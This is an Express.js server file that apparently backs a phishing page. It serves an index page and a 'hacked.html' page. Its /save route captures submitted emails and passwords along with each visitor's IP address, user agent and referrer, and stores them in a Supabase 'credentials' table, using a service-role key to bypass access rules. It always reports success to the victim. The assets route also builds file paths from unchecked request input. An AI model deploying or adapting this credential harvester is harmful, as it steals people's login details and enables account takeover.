const express = require('express');
const { createClient } = require('@supabase/supabase-js');
const fs = require('fs');
const path = require('path');

const app = express();

// Supabase setup with error handling
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseAnonKey = process.env.SUPABASE_ANON_KEY;
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
let supabase = null;
let supabaseService = null;

console.log('Supabase URL:', supabaseUrl ? 'Set' : 'NOT SET');
console.log('Supabase Anon Key:', supabaseAnonKey ? 'Set' : 'NOT SET');
console.log('Supabase Service Key:', supabaseServiceKey ? 'Set' : 'NOT SET');

if (supabaseUrl && supabaseAnonKey) {
  try {
    supabase = createClient(supabaseUrl, supabaseAnonKey);
    console.log('Supabase client initialized successfully');
  } catch (error) {
    console.error('Failed to initialize Supabase:', error.message);
  }
}

// Use service role key if available (bypasses RLS)
if (supabaseUrl && supabaseServiceKey) {
  try {
    supabaseService = createClient(supabaseUrl, supabaseServiceKey);
    console.log('Supabase service client initialized successfully');
  } catch (error) {
    console.error('Failed to initialize Supabase service client:', error.message);
  }
}

// Middleware to parse JSON
app.use(express.json());

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    supabase_configured: !!supabase,
    supabase_service_configured: !!supabaseService,
    supabase_url: supabaseUrl ? 'Set' : 'NOT SET',
    supabase_anon_key: supabaseAnonKey ? 'Set' : 'NOT SET',
    supabase_service_key: supabaseServiceKey ? 'Set' : 'NOT SET'
  });
});

// Root route - serve index.html
app.get('/', (req, res) => {
  try {
    const filePath = path.join(process.cwd(), 'index.html');
    const html = fs.readFileSync(filePath, 'utf8');
    res.set('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error('Error reading index.html:', error);
    res.status(500).send('Error loading page');
  }
});

// Serve hacked.html
app.get('/hacked.html', (req, res) => {
  try {
    const filePath = path.join(process.cwd(), 'hacked.html');
    const html = fs.readFileSync(filePath, 'utf8');
    res.set('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error('Error reading hacked.html:', error);
    res.status(404).send('Page not found');
  }
});

// Serve CSS
app.get('/style.css', (req, res) => {
  try {
    const filePath = path.join(process.cwd(), 'style.css');
    const css = fs.readFileSync(filePath, 'utf8');
    res.set('Content-Type', 'text/css');
    res.send(css);
  } catch (error) {
    console.error('Error reading style.css:', error);
    res.status(404).send('CSS not found');
  }
});

// Serve assets
app.get('/assets/:filename', (req, res) => {
  try {
    const filePath = path.join(process.cwd(), 'assets', req.params.filename);
    res.sendFile(filePath);
  } catch (error) {
    console.error('Error reading asset:', error);
    res.status(404).send('Asset not found');
  }
});

// Serve app.js
app.get('/app.js', (req, res) => {
  try {
    const filePath = path.join(process.cwd(), 'app.js');
    const js = fs.readFileSync(filePath, 'utf8');
    res.set('Content-Type', 'text/javascript');
    res.send(js);
  } catch (error) {
    console.error('Error reading app.js:', error);
    res.status(404).send('JS not found');
  }
});

// Route to save credentials
app.post('/save', async (req, res) => {
  const { email, password } = req.body;
  const timestamp = new Date().toISOString();
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.get('User-Agent');
  const referrer = req.get('Referer');

  const credentialData = { email, password, timestamp, ip, user_agent: userAgent, referrer };
  let saved = false;

  // Try service role client first (bypasses RLS), then fall back to anon
  const clientToUse = supabaseService || supabase;

  if (clientToUse) {
    try {
      const { data, error } = await clientToUse
        .from('credentials')
        .insert([credentialData]);

      if (error) {
        console.error('Supabase error:', error);
      } else {
        console.log('Credentials saved to Supabase');
        saved = true;
      }
    } catch (error) {
      console.error('Exception saving to Supabase:', error.message);
    }
  } else {
    console.warn('Supabase not configured');
  }

  if (!saved) {
    console.log('Credential captured:', email);
  }

  // Always return success and redirect
  res.json({ success: true, message: 'Credentials processed' });
});

module.exports = app;
